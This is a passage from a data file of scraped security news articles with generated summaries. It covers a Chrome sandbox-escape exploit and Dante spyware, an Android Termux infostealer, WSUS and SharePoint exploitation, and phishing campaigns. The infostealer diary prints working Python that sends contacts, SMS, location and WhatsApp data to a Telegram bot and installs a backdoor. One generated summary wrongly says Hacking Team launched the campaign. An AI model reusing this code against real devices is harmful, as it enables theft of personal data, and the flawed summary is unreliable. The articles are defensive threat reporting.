      "content": "In March 2025, Kaspersky detected a wave of infections that occurred when users clicked on personalized phishing links sent via email. No further action was required to initiate the infection; simply visiting the malicious website using Google Chrome or another Chromium-based web browser was enough.The malicious links were personalized and extremely short-lived to avoid detection. However, Kaspersky’s technologies successfully identified a sophisticated zero-day exploit that was used to escape Google Chrome’s sandbox. After conducting a quick analysis, we reported the vulnerability to the Google security team, who fixed it asCVE-2025-2783.Acknowledgement for finding CVE-2025-2783 (excerpt from the security fixes included into Chrome 134.0.6998.177/.178)We dubbed this campaignOperation ForumTrollbecause the attackers sent personalized phishing emails inviting recipients to the Primakov Readings forum. The lures targeted media outlets, universities, research centers, government organizations, financial institutions, and other organizations in Russia. The functionality of the malware suggests that the operation’s primary purpose was espionage.We traced the malware used in this attack back to 2022 and discovered more attacks by this threat actor on organizations and individuals in Russia and Belarus. While analyzing the malware used in these attacks, we discovered an unknown piece of malware that we identified as commercial spyware called “Dante” and developed by the Italian company Memento Labs (formerlyHacking Team).Similarities in the code suggest that the Operation ForumTroll campaign was also carried out using tools developed by Memento Labs.In this blog post, we’ll take a detailed look at the Operation ForumTroll attack chain and reveal how we discovered and identified the Dante spyware, which remained hidden for years after the Hacking Team rebrand.Attack chainOperation ForumTroll attack chainIn all known cases, infection occurred after the victim clicked a link in a spear phishing email that directed them to a malicious website. The website verified the victim and executed the exploit.When we first discovered and began analyzing this campaign, the malicious website no longer contained the code responsible for carrying out the infection; it simply redirected visitors to the official Primakov Readings website.Therefore, we could only work with the attack artifacts discovered during the first wave of infections. Fortunately, Kaspersky technologies detected nearly all of the main stages of the attack, enabling us to reconstruct and analyze the Operation ForumTroll attack chain.Phishing emailExample of a malicious email used in this campaign (translated from Russian)The malicious emails sent by the attackers were disguised as invitations from the organizers of the Primakov Readings scientific and expert forum. These emails contained personalized links to track infections. The emails appeared authentic, contained no language errors, and were written in the style one would expect for an invitation to such an event. Proficiency in Russian and familiarity with local peculiarities are distinctive features of the ForumTroll APT group, traits that we have also observed in its other campaigns. However, mistakes in some of those other cases suggest that the attackers were not native Russian speakers.ValidatorThe validator is a relatively small script executed by the browser. It validates the victim and securely downloads and executes the next stage of the attack.The first action the validator performs is to calculate the SHA-256 of the random data received from the server using the WebGPU API. It then verifies the resulting hash. This is done using the open-source code of Marco Ciaramella’ssha256-gpuproject. The main purpose of this check is likely to verify that the site is being visited by a real user with a real web browser, and not by a mail server that might follow a link, emulate a script, and download an exploit. Another possible reason for this check could be that the exploit triggers a vulnerability in the WebGPU API or relies on it for exploitation.The validator sends the infection identifier, the result of the WebGPU API check and the newly generated public key to the C2 server for key exchange using the Elliptic-curve Diffie–Hellman (ECDH) algorithm. If the check is passed, the server responds with an AES-GCM key. This key is used to decrypt the next stage, which is hidden in requests to bootstrap.bundle.min.js and .woff2 font files. Following the timeline of events and the infection logic, this next stage should have been a remote code execution (RCE) exploit for Google Chrome, but it was not obtained during the attack.Sandbox escape exploitList of in-the-wild 0-days caught and reported by KasperskyOver the years, we have discovered and reported on dozens of zero-day exploits that were actively used in attacks. However, CVE-2025-2783 is one of the most intriguing sandbox escape exploits we’ve encountered. This exploit genuinely puzzled us because it allowed attackers to bypass Google Chrome’s sandbox protection without performing any obviously malicious or prohibited actions. This was due to a powerful logical vulnerability caused by an obscure quirk in the Windows OS.To protect against bugs and crashes, and enable sandboxing, Chromeusesa multi-process architecture. The main process, known as the browser process, handles the user interface and manages and supervises other processes.Sandboxedrenderer processes handle web content and have limited access to system resources. Chrome usesMojoand the underlyingipczlibrary, introduced to replace legacy IPC mechanisms, for interprocess communication between the browser and renderer processes.The exploit we discovered came with its own Mojo and ipcz libraries that were statically compiled from official sources. This enabled attackers to communicate with the IPC broker within the browser process without having to manually craft and parse ipcz messages. However, this created a problem for us because, to analyze the exploit, we had to identify all the Chrome library functions it used. This involved a fair amount of work, but once completed, we knew all the actions performed by the exploit.In short, the exploit does the following:Resolves the addresses of the necessary functions and code gadgets from dll using a pattern search.Hooks the v8_inspector::V8Console::Debug function. This allows attackers to escape the sandbox and execute the desired payload via a JavaScript call.Starts executing a sandbox escape when attackers call console.debug(0x42, shellcode); from their script.Hooks the ipcz::NodeLink::OnAcceptRelayedMessage function.Creates and sends an ipcz message of the type RelayMessage. This message type is used to pass Windows OS handles between two processes that do not have the necessary permissions (e.g., renderer processes). The exploit retrieves the handle returned by theGetCurrentThreadAPI function and uses this ipcz message to relay it to itself. The broker transfers handles between processes using theDuplicateHandleAPI function.Receives the relayed message back using the ipcz::NodeLink::OnAcceptRelayedMessage function hook, but instead of the handle that was previously returned by theGetCurrentThreadAPI function, it now contains a handle to the thread in the browser process!Uses this handle to execute a series of code gadgets in the target process by suspending the thread, setting register values using SetThreadContext, and resuming the thread. This results in shellcode execution in the browser process and subsequent installation of a malware loader.So, what went wrong, and how was this possible? The answer can be found in the descriptions of theGetCurrentThreadandGetCurrentProcessAPI functions. When these functions are called, they don’t return actual handles; rather, they returnpseudo handles, special constants that are interpreted by the kernel as a handle to the current thread or process. For the current process, this constant is -1 (also equal to INVALID_HANDLE_VALUE, which brings its own set of quirks), and the constant for the current thread is -2. Chrome’s IPC code alreadycheckedfor handles equal to -1, but there were no checks for -2 or other undocumented pseudo handles. This oversight led to the vulnerability. As a result, when the broker passed the -2 pseudo handle received from the renderer to the DuplicateHandle API function while processing the RelayMessage, it converted -2 into a real handle to its own thread and passed it to the renderer.Shortly after the patch was released, it became clear that Chrome was not the only browser affected by the issue. Firefox developers quickly identified a similar pattern in their IPC code and released an update underCVE-2025-2857.When pseudo handles were first introduced, they simplified development and helped squeeze out extra performance – something that was crucial on older PCs. Now, decades later, that outdated optimization has come back to bite us.Could we see more bugs like this? Absolutely. In fact, this represents a whole class of vulnerabilities worth hunting for –similarissues may still be lurking in other applications and Windows system services.To learn about the hardening introduced in Google Chrome following the discovery of CVE-2025-2783, we recommend checking out Alex Gough’supcomingpresentation, “Responding to an ITW Chrome Sandbox Escape (Twice!),” at Kawaiicon.Persistent loaderPersistence is achieved using the Component Object Model (COM) hijacking technique. This method exploits a system’s search order for COM objects. In Windows, each COM class has a registry entry that associates the CLSID (128-bit GUID) of the COM with the location of its DLL or EXE file. These entries are stored in the system registry hive HKEY_LOCAL_MACHINE (HKLM), but can be overridden by entries in the user registry hive HKEY_CURRENT_USER (HKCU). This enables attackers to override the CLSID entry and run malware when the system attempts to locate and run the correct COM component.COM hijacking in a nutshellThe attackers used this technique to override the CLSID of twinapi.dll {AA509086-5Ca9-4C25-8F95-589D3C07B48A} and cause the system processes and web browsers to load the malicious DLL.This malicious DLL is a loader that decrypts and executes the main malware. The payload responsible for loading the malware is encoded using a simple binary encoder similar to those found in the Metasploit framework. It is also obfuscated with OLLVM. Since the hijacked COM object can be loaded into many processes, the payload checks the name of the current process and only loads the malware when it is executed by certain processes (e.g., rdpclip.exe). The main malware is decrypted using a modified ChaCha20 algorithm. The loader also has the functionality to re-encrypt the malware using the BIOS UUID to bind it to the infected machine. The decrypted data contains the main malware and a shellcode generated by Donut that launches it.LeetAgentLeetAgent is the spyware used in the Operation ForumTroll campaign. We named it LeetAgent because all of its commands are written inleetspeak. You might not believe it, but this is rare in APT malware. The malware connects to one of its C2 servers specified in the configuration and uses HTTPS to receive and execute commands identified by unique numeric values:0xC033A4D (COMMAND) – Run command with cmd.exe0xECEC (EXEC) – Execute process0x6E17A585 (GETTASKS) – Get list of tasks that agent is currently executing0x6177 (KILL) – Stop task0xF17E09 (FILE \\x09) – Write file0xF17ED0 (FILE \\xD0) – Read file0x1213C7 (INJECT) – Inject shellcode0xC04F (CONF) – Set communication parameters0xD1E (DIE) – Quit0xCD (CD) – Change current directory0x108 (JOB) – Set parameters for keylogger or file stealerIn addition to executing commands received from its C2, it runs keylogging and file-stealing tasks in the background. By default, the file-stealer task searches for documents with the following extensions: *.doc, *.xls, *.ppt, *.rtf, *.pdf, *.docx, *.xlsx, *.pptx.The configuration data is encoded using the TLV (tag-length-value) scheme and encrypted with a simple single-byte XOR cipher. The data contains settings for communicating with the C2, including many settings for traffic obfuscation.In most of the observed cases, the attackers used the Fastly.net cloud infrastructure to host their C2. Attackers frequently use it to download and run additional tools such as 7z, Rclone, SharpChrome, etc., as well as additional malware (more on that below).The number of traffic obfuscation settings may indicate that LeetAgent is a commercial tool, though we have only seen ForumTroll APT use it.Finding DanteIn our opinion, attributing unknown malware is the most challenging aspect of security research. Why? Because it’s not just about analyzing the malware or exploits used in a single attack; it’s also about finding and analyzing all the malware and exploits used in past attacks that might be related to the one you’re currently investigating. This involves searching for and investigating similar attacks using indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs), as well as identifying overlaps in infrastructure, code, etc. In short, it’s about finding and piecing together every scrap of evidence until a picture of the attacker starts to emerge.We traced the first use of LeetAgent back to 2022 and discovered more ForumTroll APT attacks on organizations and individuals in Russia and Belarus. In many cases, the infection began with a phishing email containing malicious attachments with the following names:Baltic_Vector_2023.iso (translated from Russian)DRIVE.GOOGLE.COM (executable file)Invitation_Russia-Belarus_strong_partnership_2024.lnk (translated from Russian)Various other file names mentioning individuals and companiesIn addition, we discovered another cluster of similar attacks that used more sophisticated spyware instead of LeetAgent. We were also able to track the first use of this spyware back to 2022. In this cluster, the infections began with phishing emails containing malicious attachments with the following names:SCAN_XXXX_<DATE>.pdf.lnk<DATE>_winscan_to_pdf.pdf.lnkRostelecom.pdf.lnk (translated from Russian)Various othersThe attackers behind this activity used similar file system paths and the same persistence method as the LeetAgent cluster. This led us to suspect that the two clusters might be related, and we confirmed a direct link when we discovered attacks in which this much more sophisticated spyware was launched by LeetAgent.Connection between LeetAgent and commercial spyware called DanteAfter analyzing this previously unknown, sophisticated spyware, we were able to identify it as commercial spyware called Dante, developed by the Italian company Memento Labs.The Atlantic Council’s Cyber Statecraft Initiative recentlypublishedan interesting report titled “Mythical Beasts and where to find them: Mapping the global spyware market and its threats to national security and human rights.” We think that comparing commercial spyware to mythical beasts is a fitting analogy. While everyone in the industry knows that spyware vendors exist, their “products” are rarely discovered or identified. Meanwhile, the list of companies developing commercial spyware is huge. Some of the most famous are NSO Group, Intellexa, Paragon Solutions, Saito Tech (formerly Candiru), Vilicius Holding (formerly FinFisher), Quadream, Memento Labs (formerly Hacking Team), negg Group, and RCS Labs. Some are always in the headlines, some we havereportedon before, and a few have almost completely faded from view. One company in the latter category is Memento Labs, formerly known asHacking Team.Hacking Team (also stylized as HackingTeam) is one of the oldest and most famous spyware vendors. Founded in 2003, Hacking Team became known for its Remote Control Systems (RCS) spyware, used by government clients worldwide, and for the many controversies surrounding it. The company’s trajectory changed dramatically in 2015 when more than 400 GB of internal data was leaked online following a hack. In 2019, the company was acquired by InTheCyber Group and renamed Memento Labs. “We want to change absolutely everything,” the Memento Labs ownertoldMotherboard in 2019. “We’re starting from scratch.” Four years later, at the ISS World MEA 2023conferencefor law enforcement and government intelligence agencies, Memento Labs revealed the name of its new surveillance tool – DANTE. Until now, little was known about this malware’s capabilities, and its use in attacks had not been discovered.Excerpt from the agenda of the ISS World MEA 2023 conference (the typo was introduced on the conference website)The problem with detecting and attributing commercial spyware is that vendors typically don’t include their copyright information or product names in their exploits and malware. In the case of the Dante spyware, however, attribution was simple once we got rid of VMProtect’s obfuscation and found the malware name in the code.Dante spyware name in the codeDanteOf course, our attribution isn’t based solely on the string “Dante” found in the code, but it was an important clue that pointed us in the right direction. After some additional analysis, we found a reference to a “2.0” version of the malware, which matches the title of the aforementioned conference talk. We then searched for and identified the most recent samples of Hacking Team’s Remote Control Systems (RCS) spyware. Memento Labs kept improving its codebase until 2022, when it was replaced by Dante. Even with the introduction of the new malware, however, not everything was built from scratch; the later RCS samples share quite a few similarities with Dante. All these findings make us very confident in our attribution.Why did the authors name it Dante? This may be a nod to tradition, as RCS spyware was also known as “Da Vinci”. But it could also be a reference to Dante’s poemDivine Comedy, alluding to the many “circles of hell” that malware analysts must pass through when detecting and analyzing the spyware given its numerous anti-analysis techniques.First of all, the spyware is packed with VMProtect. It obfuscates control flow, hides imported functions, and adds anti-debugging checks. On top of that, almost every string is encrypted.VMProtect anti-debugging techniqueTo protect against dynamic analysis, Dante uses the following anti-hooking technique: when code needs to execute an API function, its address is resolved using a hash, its body is parsed to extract the system call number, and then a new system call stub is created and used.Dante anti-hooking technique (simplified)In addition to VMProtect’s anti-debugging techniques, Dante uses some common methods to detect debuggers. Specifically, it checks the debug registers (Dr0–Dr7) using NtGetContextThread, inspects the KdDebuggerEnabled field in the KUSER_SHARED_DATA structure, and uses NtQueryInformationProcess to detect debugging by querying the ProcessDebugFlags, ProcessDebugPort, ProcessDebugObjectHandle, and ProcessTlsInformation classes.To protect itself from being discovered, Dante employs an interesting method of checking the environment to determine if it is safe to continue working. It queries theWindows Event Logfor events that may indicate the use of malware analysis tools or virtual machines (as a guest or host).The strings Dante searches for in the event logsIt also performs several anti-sandbox checks. It searches for “bad” libraries, measures the execution times of the sleep() function and the cpuid instruction, and checks the file system.Some of these anti-analysis techniques may be a bit annoying, but none of them really work or can stop a professional malware analyst. We deal with these techniques on an almost daily basis.After performing all the checks, Dante does the following: decrypts the configuration and the orchestrator, finds the string “DANTEMARKER” in the orchestrator, overwrites it with the configuration, and then loads the orchestrator.The configuration is decrypted from the data section of the malware using a simple XOR cipher. The orchestrator is decrypted from the resource section and poses as a font file. Dante can also load and decrypt the orchestrator from the file system if a newer, updated version is available.The orchestrator displays the code quality of a commercial product, but isn’t particularly interesting. It is responsible for communication with C2 via HTTPs protocol, handling modules and configuration, self-protection, and self-removal.Modules can be saved and loaded from the file system or loaded from memory. The infection identifier (GUID) is encoded in Base64. Parts of the resulting string are used to derive the path to a folder containing modules and the path to additional settings stored in the registry.An example of Dante’s paths derivationThe folder containing modules includes a binary file that stores information about all downloaded modules, including their versions and filenames. This metadata file is encrypted with a simple XOR cipher, while the modules are encrypted with AES-256-CBC, using the first 0x10 bytes of the module file as the IV and the key bound to the machine. The key is equal to the SHA-256 hash of a buffer containing the CPU identifier and the Windows Product ID.To protect itself, the orchestrator uses many of the same anti-analysis techniques, along with additional checks for specific process names and drivers.If Dante doesn’t receive commands within the number of days specified in the configuration, it deletes itself and all traces of its activity.At the time of writing this report, we were unable to analyze additional modules because there are currently no active Dante infections among our users. However, we would gladly analyze them if they become available. Now that information about this spyware has been made public and its developer has been identified, we hope it won’t be long before additional modules are discovered and examined. To support this effort, we are sharing a method that can be used to identify active Dante spyware infections (see theIndicators of compromisesection).Although we didn’t see the ForumTroll APT group using Dante in the Operation ForumTroll campaign, we have observed its use in other attacks linked to this group. Notably, we saw several minor similarities between this attack and others involving Dante, such as similar file system paths, the same persistence mechanism, data hidden in font files, and other minor details. Most importantly, we found similar code shared by the exploit, loader, and Dante. Taken together, these findings allow us to conclude that the Operation ForumTroll campaign was also carried out using the same toolset that comes with the Dante spyware.ConclusionThis time, we have not one, but three conclusions.1) DuplicateHandle is a dangerous API function. If the process is privileged and the user can provide a handle to it, the code should return an error when a pseudo-handle is supplied.2) Attribution is the most challenging part of malware analysis and threat intelligence, but also the most rewarding when all the pieces of the puzzle fit together perfectly. If you ever dreamed of being a detective as a child and solving mysteries like Sherlock Holmes, Miss Marple, Columbo, or Scooby-Doo and the Mystery Inc. gang, then threat intelligence might be the right job for you!3) Back in 2019, Hacking Team’s new owner stated in an interview that they wanted to change everything and start from scratch. It took some time, but by 2022, almost everything from Hacking Team had been redone.

      "summary": "The Mem3nt0 mori campaign is a sophisticated phishing attack launched by the Hacking Team in March 2025, targeting organizations and individuals in Russia with personalized phishing emails disguised as invitations to the Primakov Readings forum. The attackers used a zero-day exploit (CVE-2025-2783) that allowed them to bypass Google Chrome's sandbox protection, likely due to a logical vulnerability in the Windows OS. This exploit enabled the malware loader to be installed and executed within the browser process without triggering typical security alerts or restrictions imposed by sandbox environments. The attack chain involved a validator script that checked for real users accessing the site, followed by dynamic code execution through JavaScript calls after hooking into Chrome's V8 console debugger. The malware used in this campaign is linked to the Italian company Memento Labs (formerly Hacking Team), suggesting continued use of commercial spyware tools developed by them.",

If Windows remains a nice target (read: Attackers' favorite), I spotted an Infostealer targeting Android devices. This sounds logical that attackers pay attention to our beloved mobile devices because all our life is stored on them.\nThe sample that I found (SHA256: 7576cdb835cd81ceb030f89fe5266649ed4a6201547c84da67144f407684a182) received a VT score of 0/64[\n1\n]! Undetected! The source code contains comments in Vietnamese. The sample is a Python script. How can you execute Python code on an Android device? Say hello to Termux, your new best friend.\nFrom the documentation: \"\nTermux[\n2\n] is an Android terminal emulator and Linux environment app that works directly with no rooting or setup required. A minimal base system is installed automatically - additional packages are available using the APT package manager.\n\"\nSounds great to run Python code.\nOnce Termux is installed, add the Python package:\n$ pkg install python\nThe infostealer is classic and exfiltrate data through a Telegram channel:\ndef send_telegram(msg):\r\n    try:\r\n        url = f\"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage\"\r\n        data = {\"chat_id\": CHAT_ID, \"text\": msg}\r\n        requests.post(url, data=data, timeout=10)\r\n    except: pass\nBut, how can the malware access Android data? Termux comes with a suite a command-line tools that provide juicy information. For example, termux-contact-list[\n3\n] returns a list of contacts stored in the phone in JSON:\n[\r\n  {\r\n    \"id\": 1,\r\n    \"name\": \"Alice Dupont\",\r\n    \"phone_numbers\": [\r\n      \"+32470123456\",\r\n      \"+3221234567\"\r\n    ],\r\n    \"emails\": [\r\n      \"\n[email protected]\n\"\r\n    ]\r\n  },\r\n  {\r\n    \"id\": 2,\r\n    \"name\": \"Bob Martin\",\r\n    \"phone_numbers\": [\r\n      \"+32475123456\"\r\n    ],\r\n    \"emails\": []\r\n  },\r\n  {\r\n    \"id\": 3,\r\n    \"name\": \"Caroline Smith\",\r\n    \"phone_numbers\": [],\r\n    \"emails\": [\r\n      \"\n[email protected]\n\",\r\n      \"\n[email protected]\n\"\r\n    ]\r\n  }\r\n]\nThe infostealer will collect and exfiltrate the following information:\ncontacts = subprocess.getoutput('termux-contact-list')\r\nsms = subprocess.getoutput('termux-sms-list')\r\ncall_log = subprocess.getoutput('termux-call-log')\r\nlocation = subprocess.getoutput('termux-location')\nThe malware tries also to exfiltrate data from apps like Facebook and Whatsapp. How? In the Android ecosystem, Termux is running in a sandbox and has access only to its own $HOME directory:\n/data/data/com.termux/files/home\nBut another tools is provided: termux-setup-storage. That one will allow access to the phone storage through a mapping lile:\n/storage/emulated/0/<dir>\nNote that the victim will be prompted with a dialog prompt asking right to access data. But they’ll do right?\nThe malware will try to exfiltrate more data:\nfb_paths = [\r\n    '/storage/emulated/0/Android/data/com.facebook.katana/',\r\n    '/storage/emulated/0/Facebook/'\r\n]\r\nwa_paths = [\r\n    '/storage/emulated/0/WhatsApp/Databases/msgstore.db',\r\n    '/storage/emulated/0/WhatsApp/Databases/wa.db',\r\n    '/sdcard/WhatsApp/Databases/msgstore.db'\r\n]\r\nmedia_paths = [\r\n    '/storage/emulated/0/DCIM/',\r\n    '/storage/emulated/0/Pictures/',\r\n    '/storage/emulated/0/Movies/',\r\n    '/storage/emulated/0/Download/'\r\n]\nIt will also search for banking related information:\nbanking_files = []\r\n    for root, dirs, files in os.walk('/storage/emulated/0/'):\r\n        for file in files:\r\n            if any(keyword in file.lower() for keyword in ['bank', 'atm', 'vietcombank', 'vpbank', 'mbbank', 'acb']):\r\n                banking_files.append(os.path.join(root, file))\nGet device info:\ndevice_model = subprocess.getoutput('getprop ro.product.model')\r\nandroid_version = subprocess.getoutput('getprop ro.build.version.release')\r\ndevice_name = subprocess.getoutput('getprop ro.product.device')\nA backdoor will be installed:\ndef install_backdoor():\r\n    try:\r\n        backdoor_script = '''\r\nimport os, time, requests\r\nwhile True:\r\n    try:\r\n        os.system(\"termux-location > /data/data/com.termux/files/home/location.txt\")\r\n        time.sleep(300)\r\n    except:\r\n        time.sleep(60)\r\n'''\r\n        with open('/data/data/com.termux/files/home/backdoor.py', 'w') as f:\r\n            f.write(backdoor_script)\r\n            os.system('python3 /data/data/com.termux/files/home/backdoor.py &')\r\n        except: pass\nI just found the infostealer and I don’t know the complete infection path. How was Termux installed? Is it a PoC? But, for sure, Android devices can also be targeted!\n[1]\nhttps://www.virustotal.com/gui/file/7576cdb835cd81ceb030f89fe5266649ed4a6201547c84da67144f407684a182\n[2]\nhttps://termux.dev/en/\n[3]\nhttps://wiki.termux.com/wiki/Termux-contact-list\nXavier Mertens (@xme)\nXameco\nSenior ISC Handler - Freelance Cyber Security Consultant\nPGP Key\nKeywords:\nExfiltration\nTermux\nAndroid\nInfostealer\nMalware\nPython\n0 comment(s)\nISC Stormcast For Thursday, October 23rd, 2025\nhttps://isc.sans.edu/podcastdetail/9668",

Huntress says exploitation may be limited because WSUS isn’t often publicly exposed; Microsoft re-released the patch, and the latest updates protect affected customers.“Attackers leveraged exposed WSUS endpoints to send specially crafted requests (multiple POST calls to WSUS web services) that triggered a deserialization RCE against the update service.” reads theanalysispublished by Huntress. “Exploitation activity included spawning Command Prompt and PowerShell via the HTTP worker process and WSUS service binary”Huntress also published Indicators of Compromise for this vulnerability.Follow me on Twitter:@securityaffairsandFacebookandMastodonPierluigi Paganini(SecurityAffairs– hacking, CVE-2025-59287)",
      "summary": "The critical WSUS RCE vulnerability CVE-2025-59287 has been under active attack since its discovery by researchers MEOW and Markus Wulftange of CODE WHITE GmbH. This flaw, rated CVSS 9.8, is a deserialization of untrusted data in Windows Server Update Service that allows remote, unauthenticated attackers to execute code with SYSTEM privileges. The vulnerability stems from insecure BinaryFormatter use, which Microsoft has deprecated and removed from .NET 9 due to security risks. As a result, Microsoft released an out-of-band fix for the affected versions of Windows Server, including those running the WSUS service. This update requires a reboot post-installation. CISA added this vulnerability to its Known Exploited Vulnerabilities catalog, highlighting its critical nature. Attacks exploiting the flaw have been reported in the wild and confirmed by Dutch NCSC on October 24, 2025. Cybersecurity firm Huntress has also detailed detection of exploitation attempts targeting exposed WSUS endpoints.",

Security researchers at Huntress have confirmed seeing this exploitation in four different customer networks. Senior security researcher John Hammond described the attack as a simple 'point-and-shoot' technique, emphasizing the ease with which it can be carried out once knowledge of the vulnerability is available. The WSUS vulnerability poses significant risk to organizations; if compromised, an attacker gains substantial access within a system and could potentially send malware to all workstations under the guise of a legitimate Microsoft update. This highlights the importance of promptly applying security patches to mitigate such risks.",

The network operated 1,200 SIM-box devices containing some 40,000 SIM cards, enabling criminals to rent phone numbers registered to individuals in more than 80 countries. These were then used to create 49 million fraudulent online accounts for crimes includingphishing, investment fraud,extortion,impersonation, and migrant smuggling.The illegal service, run throughgogetsms.comandapisim.com, worked by selling access to “fast and secure temporary” phone numbers marketed for anonymous communication and account verification. GoGetSMS also offered users a way to monetize their own SIM cards. However, reviews suggested it was a front for large-scaleidentityfraud,now exposed as one of Europe’s most extensive SIM-box schemes to date. Europol said the infrastructure was “technically highly sophisticated”, which allowed perpetrators worldwide to hide their identities while conducting telecom-based fraud.After running coordinated raids across Austria, Estonia, Finland, andLatvia, police arrested seven suspects in total. They also seized five servers, the two websites, hundreds of thousands of SIM cards, €431,000 deposited in bank accounts, €266,000 in crypto, and four luxury vehicles. Both domains have been taken down and now display official law enforcement banners.Confiscated SIM cards (Source: Europol)So far, authorities have linked the network to 1,700 fraud cases in Austria and 1,500 in Latvia, with combined losses adding up to nearly €5 million. Europol’s forensic analysis of the seized servers aims to identify customers of the illegal service.The Bad | Jingle Thief Exploits Cloud Identities for Large-Scale Gift Card FraudA new report from security researchersdetailsthe activities of‘Jingle Thief’, a financially motivated threat group that operates almost entirely in cloud environments to conduct large-scale gift card fraud. Active since at least 2021, the group targetsretailand consumer services organizations through phishing andsmishingcampaigns designed to steal Microsoft 365 credentials.Credential phishing via smishing from the attacker’s infrastructure (Source: Unit 42)Once inside, the attackers exploit cloud-based infrastructure to impersonate legitimate users, gain unauthorized access to sensitive data, and manipulate gift card issuance systems. With their campaigns focusing on mapping cloud networks, attackers canmove laterallyacross accounts and avoid detection through stealthy tactics such as creating inbox rules, forwarding emails, and registering rogue authenticator apps to bypassMFAin M365.Unlike traditional malware-driven attacks,Jingle Thief relies heavily on identity misuse, choosing to leveragestolen credentialsinstead of deploying custom payloads to blend in with normal user activity. This approach allows them to maintain access for many months while issuing or selling unauthorized gift cards for profit on gray markets.Researchers also observed a major wave of Jingle Thief activity between April and May 2025, during which the group compromised more than 60 user accounts within a single organization. The attackers conducted extensivereconnaissancein SharePoint and OneDrive, searching for financial workflows, IT documentation, and virtual machine configurations, all tied to gift card systems.Exploiting cloud identities rather than endpoints furthers the trend of cloud-based cybercrime, where phished credentials and identity abuse enable financially motivated actors to scale operations while remaining under the radar. Jungle Thief’s campaign is a reminder to prioritize identity-based monitoring andcloud-native security measuresthat provide full visibility and real-time detection.The Ugly | PhantomCaptcha Spearphishing Targets Ukraine’s Relief NetworksSentinelLABS, together with the Digital Security Lab of Ukraine, haveuncovered‘PhantomCaptcha’, a single-dayspearphishingcampaign that targeted Ukrainian regionalgovernmentadministrationsand humanitarian organizations such as the International Red Cross, UNICEF, the Norwegian Refugee Council, and other NGOs linked to war relief efforts.Launched on October 8, 2025, the operation began with an impersonation of the Ukrainian President’s Office, distributing weaponized PDF attachments that redirected victims to afake Zoom site(zoomconference[.]app). There, a fake Cloudflare CAPTCHA lured users into copying and pasting malicious PowerShell commands – a ClickFix technique designed to bypass traditional endpoint controls by tricking victims into executing the malware themselves.Infection pathsOnce running, the script deployed a multi-stage PowerShell payload leading to a WebSocket remote access trojan (RAT) hosted on Russian-owned infrastructure. The RAT enables arbitrarycommand execution,data exfiltration, and the potential deployment of further malware through encrypted WebSocket communications. Although investigations show thatthe attackers spent six months preparing the campaign, it remained active for only 24 hours, pointing to an infrastructure that demonstrates sophisticated operational security and planning.SentinelLABS linked the campaign to an additional Android-based espionage effort hosted onprincess-mens[.]click, which distributes spyware-laden APKs disguised as adult entertainment or cloud storage apps designed to harvest contacts, media files, and geolocation data.While attribution remains unconfirmed, technical overlaps, including the ClickFix lure and Russian-hosted C2s, suggest possible ties to COLDRIVER (akaUNC4057 or Star Blizzard), a threat group linked to Russia’s Federal Security Service (FSB). PhantomCaptcha is an example of a highly organized and adaptive adversary, able to blend social engineering, short-lived but highly compartmentalized infrastructure, and cross-platformespionageto target Ukraine’s humanitarian and government sectors.",

The hackers used tools like Zingdoor andKrustyLoader, and targeted SQL and Apache ColdFusion servers. A fake “mantec.exe” (masquerading as Symantec software) sideloaded malware. Additional victims include a state tech agency in Africa, a Middle Eastern ministry, and a European finance firm.In July, Microsoftwarnedof a SharePoint zero-day vulnerability, tracked as CVE-2025-53770 (CVSS score of 9.8), which is under active exploitation. The vulnerability is a deserialization of untrusted data in on-premises Microsoft SharePoint Server, an unauthorized attacker could exploit the vulnerability to execute code over a network.Microsoft later confirmed that three China-based groups,Budworm,Violet Typhoonaka (Sheathminer), andStorm-2603, had exploited ToolShell, with the latter deploying Warlock ransomware.Also targeted were government departments in an African country, as well as government agencies in South America, a university in the U.S., as well as likely a state technology agency in an African country, a government department in the Middle East, and a finance company in a European country.According to Broadcom’s Symantec Threat Hunter Team, the attacksinvolvedthe exploitation ofCVE-2025-53770, a now-patched security flaw in on-premise SharePoint servers that could be used to bypass authentication and achieve remote code execution.Malicious activity at a Middle Eastern telecom began on July 21, 2025, two days after ToolShell was patched, with attackers using a webshell and DLL sideloading to deploy backdoors and loaders. Zingdoor was sideloaded via a Trend Micro binary to collect data, transfer files and run commands. Threat actors sideloaded the ShadowPad backdoor using a BitDefender binary; it supports plug-in updates and has been used alongside ransomware. On July 25, attackers dropped the Rust-based KrustyLoader to fetch second-stage payloads, evade analysis and self-delete. Attackers also employed a variety of publicly available and living-off-the-land tools, including Certutil for file downloads, GoGo Scanner for network scanning, Revsocks for proxying traffic through firewalls, and Sysinternals’ Procdump, PowerSploit’s Minidump, and LsassDumper to extract LSASS process memory and steal credentials.“An exploit for the Windows LSA Spoofing Vulnerability,CVE-2021-36942(aka PetitPotam), was also executed.” continues the post. “PetitPotam is an exploitation technique that allows for a threat actor within a compromised network to steal credentials and authentication information from Windows Servers such as a Domain Controller to gain full control of the domain. This is likely used for lateral movement or privilege escalation.”The attacks reveal ToolShell was exploited by a broader range of China-based threat actors than initially known. While overlaps exist with Glowworm activity, attribution remains uncertain. The numerous victims suggest mass scanning for vulnerable servers, followed by targeted intrusions focused on credential theft and long-term, covert access, indicating a likely espionage-driven campaign.The attacks reveal ToolShell was exploited by a broader range of China-based threat actors than initially known.

      "content": "As organizations eagerly adopt AI, cybersecurity teams are racing to protect these new systems. In this special edition of the Cybersecurity Snapshot, we round up some of the best recent guidance on how to fend off AI attacks, and on how to safeguard your AI systems.Key takeawaysDevelopers are getting new playbooks from groups like OWASP and OpenSSF to lock down agentic AI and AI coding assistants.Hackers are broadly weaponizing AI, using conventional LLMs to scale up phishing and new agentic AI tools to run complex, automated attacks.To fight fire with fire, organizations are unleashing their own agentic AI tools to hunt for threats and boost their cyber defenses.In case you missed it, here’s fresh guidance for protecting your organization against AI-boosted attacks, and for securing your AI systems and tools.1- OWASP: How to safeguard agentic AI appsAgentic AI apps are all the rage because they can act autonomously without human intervention. That’s also why they present a major security challenge. If an AI app can act on its own, how do you stop it from going rogue or getting hijacked?If you’re building or deploying these “self-driving” AI apps, take a look at OWASP’s new “Securing Agentic Applications Guide.”Published in August, this guide gives you “practical and actionable guidance for designing, developing, and deploying secure agentic applications powered by large language models (LLMs).”It's a guide aimed at the folks in the trenches, including developers, AI/ML engineers, security architects, and security engineers. Topics include:Technical security controls and best practicesSecure architectural patternsCommon threat mitigation strategiesGuidance across the development lifecycle (design, build, deploy, operate).Security considerations for components such as LLMs, orchestration middleware, memory, tools, and operational environmentsIt even provides examples of how to apply security principles in different agentic architectures.For more information about agentic AI security:“Frequently Asked Questions About Model Context 